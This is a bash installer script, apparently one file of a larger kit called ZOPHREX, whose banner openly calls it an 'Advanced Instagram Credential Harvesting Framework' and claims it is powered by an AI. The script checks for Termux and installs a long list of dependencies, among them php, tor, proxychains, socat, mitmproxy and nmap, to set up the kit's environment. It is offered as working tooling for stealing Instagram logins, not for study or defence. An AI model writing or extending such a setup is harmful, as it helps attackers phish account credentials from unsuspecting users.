## File 2: install.sh

```bash
#!/bin/bash
# ZOPHREX Installation Script

# Color scheme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Installation banner
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                                                                                                      ║${NC}"
echo -e "${BLUE}║${GREEN}                                    ZOPHREX INSTALLER v5.0                                    ${BLUE}║${NC}"
echo -e "${BLUE}║${YELLOW}                          Advanced Instagram Credential Harvesting Framework                      ${BLUE}║${NC}"
echo -e "${BLUE}║${RED}                                   Powered by Venice AI v4.6                                      ${BLUE}║${NC}"
echo -e "${BLUE}║                                                                                                      ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if running in Termux
if [ ! -d "/data/data/com.termux/files/home" ]; then
    echo -e "${RED}[!] This script requires Termux environment${NC}"
    exit 1
fi

# Update packages
echo -e "${YELLOW}[*] Updating packages...${NC}"
pkg update -y && pkg upgrade -y

# Install dependencies
echo -e "${YELLOW}[*] Installing dependencies...${NC}"
pkg install -y php python python-pip curl wget git openssh jq ncurses-utils nginx postgresql ruby nodejs npm golang openssl iptables dnsutils socat proxychains tor mitmproxy wireshark-cli nmap

